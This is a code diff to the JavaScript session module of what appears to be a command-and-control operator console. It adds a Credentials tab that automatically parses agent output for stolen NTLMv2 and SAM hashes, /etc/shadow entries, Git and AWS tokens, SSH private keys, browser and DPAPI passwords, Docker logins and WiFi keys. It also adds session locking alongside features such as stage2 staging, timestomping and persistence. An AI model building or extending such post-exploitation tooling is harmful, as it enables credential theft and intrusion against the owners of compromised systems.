+      const badgeCls = `cred-badge cred-badge-${(c.secret_type || 'other').replace(/\s/g, '_')}`;
+      html += `<tr data-cred-id="${escHtml(c.id)}">
+        <td>${escHtml(c.source || '—')}</td>
+        <td>${escHtml(c.protocol || '—')}</td>
+        <td>${escHtml((c.host || '') + (c.port ? ':' + c.port : '') || '—')}</td>
+        <td>${escHtml(c.domain || '—')}</td>
+        <td>${escHtml(c.notes || '—')}</td>
+        <td class="hi">${escHtml(c.username || '—')}</td>
+        <td><span class="cred-secret" title="Click to copy">${escHtml(c.secret || '—')}</span></td>
+        <td style="text-align:center"><span class="${badgeCls}">${escHtml(c.secret_type || 'other')}</span></td>
+        <td class="cred-actions">
+          <button class="btn-sm btn-sm-ghost cred-show" title="Show detail"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></button>
+          <button class="btn-sm btn-sm-ghost cred-edit" title="Edit"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 3l4 4L7 21H3v-4L17 3z"/></svg></button>
+          <button class="btn-sm btn-sm-ghost btn-sm-danger cred-del" title="Delete"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/><path d="M9 6V4h6v2"/></svg></button>
+        </td>
+      </tr>`;
+    }
+    tbody.innerHTML = html;
+  }
+
+  function _openCredModal(existing = null) {
+    const title = $('#cred-modal-title');
+    if (title) title.textContent = existing ? 'Edit Credential' : 'Add Credential';
+    $('#cred-edit-id').value = existing ? existing.id : '';
+    $('#cred-f-user').value = existing ? existing.username : '';
+    $('#cred-f-secret').value = existing ? existing.secret : '';
+    $('#cred-f-type').value = existing ? (existing.secret_type || 'password') : 'password';
+    $('#cred-f-source').value = existing ? existing.source : 'manual';
+    $('#cred-f-domain').value = existing ? existing.domain : '';
+    $('#cred-f-proto').value = existing ? existing.protocol : '';
+    $('#cred-f-host').value = existing ? existing.host : '';
+    $('#cred-f-port').value = existing ? existing.port : '';
+    $('#cred-f-notes').value = existing ? existing.notes : '';
+    Modal.open('cred-modal');
+    setTimeout(() => $('#cred-f-user').focus(), 60);
+  }
+
+  function _showCredDetail(cred) {
+    const grid = $('#cred-detail-grid');
+    if (!grid) return;
+    const fields = [
+      ['Source', cred.source],
+      ['Protocol', cred.protocol],
+      ['Host', (cred.host || '') + (cred.port ? ':' + cred.port : '')],
+      ['Domain', cred.domain],
+      ['Notes', cred.notes],
+      ['Username', cred.username],
+      ['Secret', cred.secret],
+      ['Type', cred.secret_type],
+    ];
+    grid.innerHTML = fields.map(([label, val]) => {
+      const isSec = label === 'Secret';
+      return `<div class="cred-detail-label">${escHtml(label)}</div>` +
+        `<div class="${isSec ? 'cred-detail-secret' : 'cred-detail-val'}">${escHtml(val || '—')}</div>`;
+    }).join('');
+    const copyBtn = $('#cred-detail-copy');
+    if (copyBtn) {
+      copyBtn.onclick = () => {
+        navigator.clipboard.writeText(cred.secret || '').then(() => Toast.show('ok', 'Copied to clipboard'));
+      };
+    }
+    Modal.open('cred-show-modal');
+  }
+
+  async function _saveCred() {
+    const editId = $('#cred-edit-id').value;
+    const data = {
+      username:    $('#cred-f-user').value.trim(),
+      secret:      $('#cred-f-secret').value.trim(),
+      secret_type: $('#cred-f-type').value,
+      source:      $('#cred-f-source').value.trim() || 'manual',
+      domain:      $('#cred-f-domain').value.trim(),
+      protocol:    $('#cred-f-proto').value.trim(),
+      host:        $('#cred-f-host').value.trim(),
+      port:        $('#cred-f-port').value.trim(),
+      notes:       $('#cred-f-notes').value.trim(),
+    };
+    if (!data.username || !data.secret) {
+      Toast.show('error', 'Username and secret are required');
+      return;
+    }
+    try {
+      if (editId) {
+        await API.updateCredential(_activeId, editId, data);
+      } else {
+        await API.addCredential(_activeId, data);
+      }
+      Modal.close('cred-modal');
+      Toast.show('ok', editId ? 'Credential updated' : 'Credential added');
+      _loadCreds();
+    } catch (e) {
+      Toast.show('error', 'Failed to save', e.message || '');
+    }
+  }
+
+  async function _deleteCred(credId) {
+    try {
+      await API.deleteCredential(_activeId, credId);
+      Toast.show('ok', 'Credential deleted');
+      _loadCreds();
+    } catch (e) {
+      Toast.show('error', 'Failed to delete', e.message || '');
+    }
+  }
+
+  function _credsAutoExtract(content, sessionId) {
+    if (!content || !sessionId) return;
+    const creds = [];
+    let m;
+    const src = content.includes('[creds harvest]') ? 'harvest'
+              : content.includes('[creds sam]') ? 'sam'
+              : content.includes('[creds coerce]') ? 'coerce'
+              : 'listen';
+
+    // ── Listen dump: "[PROTO:PORT] N credentials" headers followed by indented entries
+    const isDump = /^\[([\w-]+):(\d+)\]\s+\d+\s+credential/im.test(content);
+    if (isDump) {
+      const lines = content.split('\n');
+      let curProto = '', curPort = '';
+      for (const line of lines) {
+        const hdr = line.match(/^\[([\w-]+):(\d+)\]\s+\d+\s+credential/i);
+        if (hdr) {
+          const raw = hdr[1].toLowerCase();
+          curProto = raw.includes('ntlm') ? 'http-ntlm' : raw.includes('http') ? 'http' : 'smb';
+          curPort = hdr[2];
+          continue;
+        }
+        if (!line.startsWith('  ') || !line.trim()) continue;
+        const trimmed = line.trim();
+        // HTTP-Basic entry: "[HTTP-Basic] user:pass (from IP)"
+        const bm = trimmed.match(/^\[HTTP-Basic\]\s+([^:]+):(.+?)\s+\(from\s+([^)\s]+)\)/);
+        if (bm) {
+          creds.push({ username: bm[1], secret: bm[2], secret_type: 'basic', source: 'listen', protocol: curProto || 'http', host: bm[3], port: curPort });
+          continue;
+        }
+        // NTLMv2 entry: "user::DOMAIN:challenge:NTProofStr:blob"
+        const nm = trimmed.match(/^(\S+?::[\w.-]+?:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+)/i);
+        if (nm) {
+          const full = nm[1];
+          const parts = full.split('::');
+          const user = parts[0];
+          const domain = parts[1] ? parts[1].split(':')[0] : '';
+          creds.push({ username: user, secret: full, secret_type: 'ntlmv2', domain, source: 'listen', protocol: curProto || 'smb', port: curPort });
+          continue;
+        }
+      }
+    }
+
+    // NTLMv2 hashes (non-dump context: coerce, harvest): "user::DOMAIN:challenge:response:blob"
+    if (src !== 'listen') {
+      const ntlmv2Re = /^\s*(\S+?::[\w.-]+?:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+)/gim;
+      const _s2 = _sessions[sessionId] || {};
+      while ((m = ntlmv2Re.exec(content)) !== null) {
+        const full = m[1];
+        const parts = full.split('::');
+        const user = parts[0];
+        const domain = parts[1] ? parts[1].split(':')[0] : '';
+        creds.push({ username: user, secret: full, secret_type: 'ntlmv2', domain, source: src, protocol: 'smb', host: _s2.target_host || '' });
+      }
+    }
+
+    // HTTP Basic outside listen dump (standalone format)
+    if (src !== 'listen') {
+      const basicRe = /\[HTTP-Basic\]\s+([^:]+):(.+?)\s+\(from\s+([^)\s]+)\)/g;
+      while ((m = basicRe.exec(content)) !== null) {
+        creds.push({ username: m[1], secret: m[2], secret_type: 'basic', source: src, protocol: 'http', host: m[3] || '' });
+      }
+    }
+
+    // SAM hashes: "  Administrator:500:aad3b435...:31d6cfe0..:::
+    const samRe = /^\s+([\w$]+):(\d+):[0-9a-f]{32}:([0-9a-f]{32}):::/gm;
+    const _s = _sessions[sessionId] || {};
+    while ((m = samRe.exec(content)) !== null) {
+      creds.push({ username: m[1], secret: m[0].trim(), secret_type: 'ntlm', source: 'sam', protocol: 'ntlm',
+        host: _s.target_host || '', domain: _s.target_domain || '', notes: `RID:${m[2]}` });
+    }
+
+    // /etc/shadow: "    user:$type$salt$hash:..."
+    const shadowRe = /^\s{4}([\w._-]+):(\$\d+\$[^:]+):/gm;
+    const _s3 = _sessions[sessionId] || {};
+    while ((m = shadowRe.exec(content)) !== null) {
+      creds.push({ username: m[1], secret: m[0].trim(), secret_type: 'hash', source: 'harvest', protocol: 'linux', host: _s3.target_host || '', notes: '/etc/shadow' });
+    }
+
+    // Git credentials: "    https://user:token@host..."
+    const gitRe = /^\s{4}https?:\/\/([^:]+):([^@]+)@(\S+)/gm;
+    while ((m = gitRe.exec(content)) !== null) {
+      creds.push({ username: m[1], secret: m[2], secret_type: 'token', source: 'harvest', protocol: 'https', host: m[3], notes: 'Git' });
+    }
+
+    // AWS credentials: "    [profile] aws_access_key_id = AKIA..."
+    const awsKeyRe = /aws_access_key_id\s*=\s*(\S+)/gi;
+    const awsSecRe = /aws_secret_access_key\s*=\s*(\S+)/gi;
+    const awsTokRe = /aws_session_token\s*=\s*(\S+)/gi;
+    const awsKeys = []; const awsSecs = []; const awsToks = [];
+    while ((m = awsKeyRe.exec(content)) !== null) awsKeys.push(m[1]);
+    while ((m = awsSecRe.exec(content)) !== null) awsSecs.push(m[1]);
+    while ((m = awsTokRe.exec(content)) !== null) awsToks.push(m[1]);
+    for (let i = 0; i < awsKeys.length; i++) {
+      creds.push({ username: awsKeys[i], secret: awsSecs[i] || '(see harvest output)', secret_type: 'token', source: 'harvest', protocol: 'aws', notes: 'AWS IAM access key' });
+    }
+    for (let i = 0; i < awsToks.length; i++) {
+      creds.push({ username: awsKeys[i] || 'session', secret: awsToks[i], secret_type: 'token', source: 'harvest', protocol: 'aws', notes: 'AWS session token' });
+    }
+
+    // SSH keys: "    name (PLAINTEXT)" — plaintext private keys staged to artifacts
+    const sshKeyRe = /^\s{4}(\S+)\s+\(PLAINTEXT\)/gm;
+    while ((m = sshKeyRe.exec(content)) !== null) {
+      creds.push({ username: m[1], secret: '(download from artifacts)', secret_type: 'ssh_key', source: 'harvest', protocol: 'ssh', notes: 'PLAINTEXT key' });
+    }
+
+    // Section-aware parsing for pipe-delimited and arrow-delimited formats
+    // (Chrome/Edge/Firefox/DPAPI use "target | user | pass", Docker/WiFi use "X → Y")
+    const sections = content.split(/^  ───/gm);
+    for (const sec of sections) {
+      // Browser/DPAPI pipe format
+      if (/Chrome Passwords|Edge Passwords|Firefox Passwords|DPAPI Credentials/i.test(sec)) {
+        const note = /Chrome/i.test(sec) ? 'Chrome' : /Edge/i.test(sec) ? 'Edge' : /Firefox/i.test(sec) ? 'Firefox' : 'DPAPI';
+        const pipeRe = /^\s{2,4}(\S+)\s+\|\s+(\S+)\s+\|\s+(.+)/gm;
+        while ((m = pipeRe.exec(sec)) !== null) {
+          const target = m[1].trim();
+          const user = m[2].trim();
+          const secret = m[3].trim();
+          if (!user || !secret || secret === '(empty)') continue;
+          const isUrl = /^https?:\/\//.test(target);
+          creds.push({
+            username: user, secret, secret_type: 'password', source: 'harvest',
+            protocol: isUrl ? 'http' : '', host: isUrl ? target.replace(/^https?:\/\//, '').split('/')[0] : target,
+            notes: note,
+          });
+        }
+      }
+      // Docker: "registry → user:pass"
+      if (/Docker/i.test(sec)) {
+        const arrowRe = /^\s{2,4}(\S+)\s+→\s+(.+)/gm;
+        while ((m = arrowRe.exec(sec)) !== null) {
+          const val = m[2].trim();
+          const [user, pass] = val.includes(':') ? val.split(':', 2) : [val, ''];
+          if (user) creds.push({ username: user, secret: pass || val, secret_type: 'password', source: 'harvest', protocol: 'docker', host: m[1].trim(), notes: 'Docker registry' });
+        }
+      }
+      // WiFi: "SSID → PSK"
+      if (/WiFi/i.test(sec)) {
+        const arrowRe = /^\s{2,4}(.+?)\s+→\s+(\S+)/gm;
+        while ((m = arrowRe.exec(sec)) !== null) {
+          creds.push({ username: m[1].trim(), secret: m[2].trim(), secret_type: 'password', source: 'harvest', protocol: 'wifi', notes: 'WiFi' });
+        }
+      }
+    }
+
+    if (!creds.length) return;
+
+    // Dedup against existing cache
+    const existing = _credsCache[sessionId] || [];
+    const newCreds = creds.filter(c => {
+      return !existing.some(e => e.username === c.username && e.secret === c.secret);
+    });
+
+    for (const c of newCreds) {
+      API.addCredential(sessionId, c).catch(() => {});
+    }
+    if (newCreds.length) {
+      setTimeout(() => { if ($('#tp-creds.on')) _loadCreds(); }, 300);
+    }
   }
 
   function _renderPersist() {
@@ -2016,6 +2431,7 @@ const Sessions = (() => {
           ${_cell('Domain', s.target_domain)}
           ${_cell('Internal IP', s.target_ip)}
           ${_cell('External IP', s.target_ip_ext)}
+          ${s.locked ? '<div class="info-cell"><div class="info-k">Lock</div><div class="info-v" style="color:#3b82f6">🔒 Locked — kill/stop/delete disabled</div></div>' : ''}
         </div>
       </div>
 
@@ -2034,7 +2450,11 @@ const Sessions = (() => {
         <div class="info-grid">
           ${_cell('Provider', _providerLabel(s.provider))}
           ${_cell('Deploy Mode', s.deploy_mode)}
-          ${_cell('Input file', s.input_file)}
+          ${_cell('Folder Name', s.folder_path ? s.folder_path.replace(/^\/+|\/+$/g, '').split('/').pop() : null)}
+          ${_cell('Folder Path', s.folder_path)}
+          ${_cell('Input File', s.input_file?.replace(/^\/+/, ''))}
+          ${_cell('Output File', s.output_file?.replace(/^\/+/, ''))}
+          ${_cell('Heartbeat File', s.heartbeat_file?.replace(/^\/+/, ''))}
           ${_cell('Label', s.label)}
           ${(s.s2_uploaded_at && !s.s2_deleted) ? `<div class="info-cell"><div class="info-k">Stage2</div><div class="info-v" style="color:var(--warn,#e6a817)" title="Stage2 still on cloud — server cancels it at first heartbeat">⚠ On cloud since ${new Date(s.s2_uploaded_at).toLocaleTimeString()}</div></div>` : ''}
         </div>
@@ -2045,6 +2465,12 @@ const Sessions = (() => {
         <div class="info-grid">
           ${s.kill_date ? `<div class="info-cell"><div class="info-k">Kill Date</div><div class="info-v" style="color:var(--danger,#e05252)">${escHtml(s.kill_date)}</div></div>` : _cell('Kill Date', null)}
           ${_cell('Window', (s.window_start && s.window_end) ? `${s.window_start} → ${s.window_end}` : null)}
+          ${(() => {
+            const sv = window._serverVersion || '';
+            const av = s.stratum_version || '';
+            if (av && sv && av !== sv) return `<div class="info-cell"><div class="info-k">Deployed With</div><div class="info-v" style="color:var(--warn,#e6a817)" title="Server is v${escHtml(sv)} — consider re-deploying this agent">⚠ v${escHtml(av)}</div></div>`;
+            return _cell('Deployed With', av ? `v${av}` : null);
+          })()}
         </div>
       </div>
 
@@ -2259,6 +2685,8 @@ const Sessions = (() => {
 
   async function doKillAgent() {
     if (!_activeId) return;
+    const s = _sessions[_activeId];
+    if (s && s.locked) { Toast.warning('Session locked', 'Unlock the session before stopping the agent'); return; }
     const ok = await confirm('Stop Agent', 'Send EXIT to the agent — it will stop executing. No files are removed from the target.');
     if (!ok) return;
     try {
@@ -2428,6 +2856,8 @@ const Sessions = (() => {
   async function doKillSession(id) {
     const target = id || _activeId;
     if (!target) return;
+    const s = _sessions[target];
+    if (s && s.locked) { Toast.warning('Session locked', 'Unlock the session before removing'); return; }
     const ok = await confirm('Remove Session', `Remove session ${target.slice(0,8)}? This only removes the local record — no files are deleted.`);
     if (!ok) return;
     try {
@@ -2494,6 +2924,8 @@ const Sessions = (() => {
   async function doWipeSession() {
     const target = _activeId;
     if (!target) return;
+    const s = _sessions[target];
+    if (s && s.locked) { Toast.warning('Session locked', 'Unlock the session before wiping'); return; }
     const res = await confirmTyped(
       'Remove & Clean Up',
       'This will send KILL to the agent and remove the session from the manager. Keys, logs and deployment directory deletion is optional below.',
@@ -2727,7 +3159,8 @@ const Sessions = (() => {
     if (_histSid === _activeId && $('#tp-history.on')) _renderHistory();
 
     // ── Listen badge: detect listener start/stop/dump from agent response ──
-    if (content && content.includes('[creds listen]')) {
+    // listen_dump() output with credentials starts with "[SMB:445]" etc, no "[creds listen]" prefix
+    if (content && (content.includes('[creds listen]') || /\[(SMB|HTTP[-\w]*):(\d+)\]\s+\d+\s+credential/i.test(content))) {
       const sid = session_id || _activeId;
       if (sid) {
         if (!_listenActive[sid]) _listenActive[sid] = { listeners: {} };
@@ -2742,7 +3175,8 @@ const Sessions = (() => {
             for (const part of parts) {
               const pm = part.match(/^(SMB|HTTP-NTLM|HTTP):(\d+)$/i);
               if (pm) {
-                const proto = pm[1].toLowerCase().includes('http') ? 'http' : 'smb';
+                const raw = pm[1].toLowerCase();
+                const proto = raw.includes('ntlm') ? 'http-ntlm' : raw.includes('http') ? 'http' : 'smb';
                 const port = parseInt(pm[2]);
                 const key = `${proto}:${port}`;
                 if (!la[key]) la[key] = { proto, port, started_at: now, creds: [] };
@@ -2762,7 +3196,8 @@ const Sessions = (() => {
           for (const line of content.split('\n')) {
             const hdr = line.match(/^\[([\w-]+):(\d+)\]\s+(\d+)\s+credential/i);
             if (hdr) {
-              const proto = hdr[1].toLowerCase().includes('http') ? 'http' : 'smb';
+              const raw = hdr[1].toLowerCase();
+              const proto = raw.includes('ntlm') ? 'http-ntlm' : raw.includes('http') ? 'http' : 'smb';
               const port = parseInt(hdr[2]);
               currentKey = `${proto}:${port}`;
               if (!la[currentKey]) la[currentKey] = { proto, port, started_at: new Date().toISOString(), creds: [] };
@@ -2777,6 +3212,11 @@ const Sessions = (() => {
         }
         if (sid === _activeId) _updateListenBadge();
       }
+    }
+
+    // ── Auto-extract credentials from /creds output ──
+    if (content && (content.includes('[creds') || /\[(SMB|HTTP[-\w]*):(\d+)\]\s+\d+\s+credential/i.test(content))) {
+      _credsAutoExtract(content, session_id || _activeId);
     }
   }
 
@@ -2941,7 +3381,7 @@ const Sessions = (() => {
       }
 
       const showBtn = e.target.closest('.js-show-file');
-      if (showBtn) { _showFilePreview(showBtn.dataset.url, showBtn.dataset.name, showBtn.dataset.size); return; }
+      if (showBtn) { _showFilePreview(showBtn.dataset.url, showBtn.dataset.name, showBtn.dataset.size, showBtn.dataset.type, showBtn.dataset.md5); return; }
 
       const delBtn = e.target.closest('.js-del-file');
       if (delBtn) {
@@ -3015,6 +3455,47 @@ const Sessions = (() => {
         API.restoreUpload(_activeId, remotePath)
           .then(() => { const tr = ulRestoreBtn.closest('tr'); if (tr) _ulMarkRowRestored(tr); })
           .catch(err => Toast.error('Restore failed', err.message || String(err)));
+        return;
+      }
+
+      // Credential tab actions
+      const credShowBtn = e.target.closest('.cred-show');
+      if (credShowBtn) {
+        const tr = credShowBtn.closest('tr');
+        const credId = tr?.dataset.credId;
+        const creds = _credsCache[_activeId] || [];
+        const c = creds.find(x => x.id === credId);
+        if (c) _showCredDetail(c);
+        return;
+      }
+
+      const credEditBtn = e.target.closest('.cred-edit');
+      if (credEditBtn) {
+        const tr = credEditBtn.closest('tr');
+        const credId = tr?.dataset.credId;
+        const creds = _credsCache[_activeId] || [];
+        const c = creds.find(x => x.id === credId);
+        if (c) _openCredModal(c);
+        return;
+      }
+
+      const credDelBtn = e.target.closest('.cred-del');
+      if (credDelBtn) {
+        const tr = credDelBtn.closest('tr');
+        const credId = tr?.dataset.credId;
+        if (credId) {
+          confirm('Delete credential', 'Remove this credential entry?').then(ok => {
+            if (ok) _deleteCred(credId);
+          });
+        }
+        return;
+      }
+
+      const credSecret = e.target.closest('.cred-secret');
+      if (credSecret) {
+        navigator.clipboard.writeText(credSecret.textContent).then(() => {
+          Toast.show('ok', 'Copied to clipboard');
+        });
         return;
       }
     });
@@ -3091,10 +3572,30 @@ const Sessions = (() => {
       });
     }
 
+    const lockBtn = $('#btn-lock-toggle');
+    if (lockBtn) {
+      lockBtn.addEventListener('click', async () => {
+        if (!_activeId) return;
+        lockBtn.disabled = true;
+        try {
+          await API.toggleLock(_activeId);
+        } catch (e) {
+          Toast.error('Lock toggle failed', e.message || String(e));
+        } finally {
+          lockBtn.disabled = false;
+        }
+      });
+    }
+
     const listenBadge = $('#listen-badge');
     if (listenBadge) {
       listenBadge.addEventListener('click', _listenBadgeToggleExpand);
     }
+
+    // Credentials tab
+    _initColResize('creds-tbl', 'colw:creds-tbl');
+    $('#btn-cred-add')?.addEventListener('click', () => { if (_activeId) _openCredModal(); });
+    $('#cred-save')?.addEventListener('click', _saveCred);
 
     _startHbTicker();
   }
@@ -3109,11 +3610,19 @@ const Sessions = (() => {
     }
   }
 
+  function setLocked(id, locked) {
+    if (_sessions[id]) {
+      _sessions[id].locked = locked;
+      renderList();
+      if (id === _activeId) _renderDetail();
+    }
+  }
+
   function redraw() { renderList(); if (_activeId) _renderDetail(); }
 
   return {
-    init, select, upsert, remove, setAll, renderList, redraw, markWiping,
-    onOutput, onRemoteCommand, onArtifactsChanged, onHeartbeat, getActiveId, getSession,
+    init, select, upsert, remove, setAll, renderList, redraw, markWiping, setLocked,
+    onOutput, onRemoteCommand, onArtifactsChanged, onCredentialsChanged, onHeartbeat, getActiveId, getSession,
     doSysinfo, doTimestomp, doKillAgent,
     doSleep, doJitter, stepSleep, stepJitter,
     doPersist, doPersistProbe, doPersistProbeAll, doPersistProbeSelected,
